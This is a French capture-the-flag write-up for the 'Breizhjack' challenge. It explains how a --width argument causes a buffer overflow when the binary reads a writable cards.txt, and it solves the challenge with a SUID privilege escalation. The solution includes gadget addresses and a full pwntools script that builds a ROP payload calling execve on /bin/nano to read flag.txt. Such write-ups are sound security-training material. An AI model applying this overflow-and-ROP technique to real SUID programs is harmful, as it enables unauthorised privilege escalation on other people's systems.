# Breizhjack

## Description

Pour ce challenge, nous disposons d'un accès ssh à un serveur. Sur celui-ci se trouvent : 

 - Un binaire breizhjack  lié statiquement
 - Un binaire wrapper appartenant à l'administrateur et disposant du SUID bit
 - Un fichier flag.txt lisible uniquement par l'administrateur
 - Un fichier cards.txt que nous pouvons lire et modifier

## Reverse
Après un rapide reverse du binaire, on découvre qu'il est possible de passer un argument `--width` qui sera utilisé lors de la création du Deck afin de déterminer combien d'octets `fgets` mettra dans le buffer. Cependant, la taille du buffer reste toujours la même, ce qui nous permet de l'overflow lors de la lecture de cards.txt (que nous pouvons modifier à notre guise ;)).

## Exécuter getFlag

Le but de ce challenge sera donc d'exploiter le binaire breizhjack afin d'élever nos privilèges et de lire flag.txt. Au vu du nombre de gadgets présents dans le binaire, il existe un grand nombre de solutions ;). J'ai pour ma part opté pour une SROP avec un `sys_execve` sur `/bin/nano` (`/bin/sh`ayant tendance à dropper les privilèges).

## SROP

```asm
### 0x0805d259 ###
xor edx, edx # on place 0 dans edx
mov eax, edx # Useless mais ce n'est pas ça qui nous intéresse

### 0x08096f97 ###
mov eax, 0xb # sys_execve
pop ebx # On s'arrange pour pop l'addresse du chemin vers /bin/nano dans la heap
pop esi # On pop du padding
pop edi # On pop du padding

### 0x0804cafb ###
xor ecx, ecx # On place 0 dans ecx
int 80
```

## Payload

Personnellement, j'ai choisi de lancer le binaire avec `--width 256`. Le payload que j'ai utilisé est le suivant : (NB : la première valeur hexa que vous voyez copiée 575 fois correspond au descripteur du fichier, si on l'écrase `fgets` nous plante à la figure.)

```python
import os
from pwn import *

heap_path = 0x80e6f60 + 39 + 16
mov_eax_0xb = 0x080901b1
xor_edx_edx = 0x0805d259
xor_ecx_ecx_int_80 = 0x0804cafb
ret_gadget = 0x0804900e


os.system("cp cards.txt.bck cards.txt")

f = open("cards.txt", "rb")
lines = f.readlines()
f.close()

f = open("payload.txt", "wb")
for line in lines[:len(lines)-1]:
    f.write(line)

f.write(b"AAA" + p32(0x80e6e30)*575 + p32(ret_gadget)[:3] + b"A"*244 +  bytes([p32(ret_gadget)[3]]) + p32(0xffffb92b) + p32(xor_edx_edx) + p32(mov_eax_0xb)[:2] + b"A"*244 + p32(mov_eax_0xb)[2:] + p32(heap_path) + b"A"*429 + p32(xor_ecx_ecx_int_80) + b"A"*371 + b"/bin/nano\x00")
f.close()

os.system("rm cards.txt")
os.system("mv payload.txt cards.txt")
```